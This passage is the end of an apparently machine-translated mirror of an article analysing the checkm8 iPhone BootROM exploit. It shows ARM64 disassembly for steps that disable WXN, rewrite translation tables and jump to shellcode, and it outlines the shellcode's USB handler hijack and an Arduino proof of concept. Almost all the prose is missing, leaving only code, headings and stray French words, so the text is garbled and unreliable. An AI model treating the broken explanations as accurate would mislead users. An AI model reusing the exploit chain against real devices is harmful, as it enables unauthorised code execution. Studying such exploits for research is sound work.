ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code>  <code>0x1800B0000</code> .   <code>INSECURE MEMORY</code> ,     .    ,         : </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p>      ,          . </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64"> 5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p>   <code>WXN</code> (Write permission implies Execute-never),       <code>RW</code> .     <code>WXN</code>  -      . </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code> .       <code>BootROM</code>    ,     <code>INSECURE_MEMORY</code>  . </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p>     . </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p>      . </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p>    <code>shellcode</code> . </p><br><p>  ,   <code>callback-chain</code> ‚Äî   <code>WXN</code>     <code>shellcode</code>  <code>RW</code> -. </p><br><h2 id="6-ispolnenie-shellcode"> 6.  <code>shellcode</code> </h2><br><p>  <code>shellcode</code>   <code>src/checkm8_arm64.S</code>   : </p><br><h4 id="61-perezapis-konfiguracionnyh-usb-deskriptorov">  6.1.   <code>USB</code> - </h4><br><p>          <code>usb_core_hs_configuration_descriptor</code>  <code>usb_core_fs_configuration_descriptor</code> ,   .        .         <code>USB</code> -, <code>shellcode</code>  . </p><br><h4 id="62-izmenenie-usbserialnumber">  6.2.  <code>USBSerialNumber</code> </h4><br><p>   -   ,     <code>" PWND:[checkm8]"</code> .     ,    . </p><br><h4 id="63-perezapis-ukazatelya-obrabotchika-usb-zaprosov-na-novyy">  6.3.    <code>USB</code> -   </h4><br><p>     <code>USB</code> -       ,        . </p><br><h4 id="64-kopirovanie-obrabotchika-usb-zaprosov-v-trampoline-oblast-pamyati-0x1800afc00"> 6.4.   <code>USB</code> -  <code>TRAMPOLINE</code>   ( <code>0x1800AFC00</code> ) </h4><br><p>   <code>USB</code> -    <code>wValue</code>   <code>0xffff</code> ,    ,     .   ,         : <code>memcpy</code> , <code>memset</code>  <code>exec</code> (      ). </p><br><p>       . </p><br><h2 id="realizaciya-eksployta-na-bolee-nizkom-urovne-raboty-s-usb">         USB </h2><br><p>             <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="> Proof-of-Concept</a>  <code>checkm8</code>  <code>Arduino</code>  <code>Usb Host Shield</code> . PoC    <code>iPhone 7</code> ,         .   <code>iPhone 7</code>  <code>DFU</code>   <code>Usb Host Shield</code>       ,      <code>PWND:[checkm8]</code> ,       <code>USB</code> -         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ipwndfu</a> ( ,  -  ..).     ,       ,       <code>USB</code> -.      <a href="">USB_Host_Shield_2.0</a> .    , patch-    . </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="vmesto-zaklyucheniya">   </h2><br><p>       .    <code>checkm8</code>   . ,               .          jailbreak-. ,     jailbreak   <code>checkm8</code> ‚Äî <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">checkra1n</a> .    ,  jailbreak       ( <code>A5</code>  <code>A11</code> )    <code>iOS</code> .      <code>iWatch</code> , <code>Apple TV</code>    . ,             . </p><br><p>  jailbreak,         Apple.   <code>checkm8</code>    verbose- <code>iOS</code> ,  <code>SecureROM</code>   <code>GID</code> -    .   ,   ,           <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="> JTAG/SWD </a> .        , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">    </a> ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="> </a> . ,   <code>checkm8</code> ,  <code>Apple</code>      . </p><br><h2 id="ssylki">  Les r√©f√©rences </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="> ipwndfu  LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr471668/">https://habr.com/ru/post/fr471668/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr471658/index.html">Escrocs au t√©l√©phone. La premi√®re action dans laquelle on me parle gentiment d'autres escrocs</a></li>
<li><a href="../fr471660/index.html">Conf√©rence de psychologie des joueurs</a></li>
<li><a href="../fr471662/index.html">Web - authentification javascript, obfuscation et code natif. R√©solution de probl√®mes avec r0ot-mi Web - Client. Partie 1</a></li>
<li><a href="../fr471664/index.html">Stage chez ABBYY: une entreprise avec laquelle vous pouvez √™tre ¬´vous¬ª</a></li>
<li><a href="../fr471666/index.html">D√©couvrez un d√©veloppeur iOS qui d√©m√©nage en Allemagne avec un visa de travail</a></li>
<li><a href="../fr471670/index.html">Essayer Jetpack Compose au combat?</a></li>
<li><a href="../fr471676/index.html">Escrocs au t√©l√©phone. La deuxi√®me action, dans laquelle je tombe en panne et me dirige vers le distributeur de billets le plus proche</a></li>
<li><a href="../fr471678/index.html">Services aux ours sur demande</a></li>
<li><a href="../fr471684/index.html">Pourquoi vous devez cr√©er des modules pour Nginx</a></li>
<li><a href="../fr471686/index.html">Comment AWS fabrique ses services r√©silients. Mise √† l'√©chelle du serveur et de la base de donn√©es</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>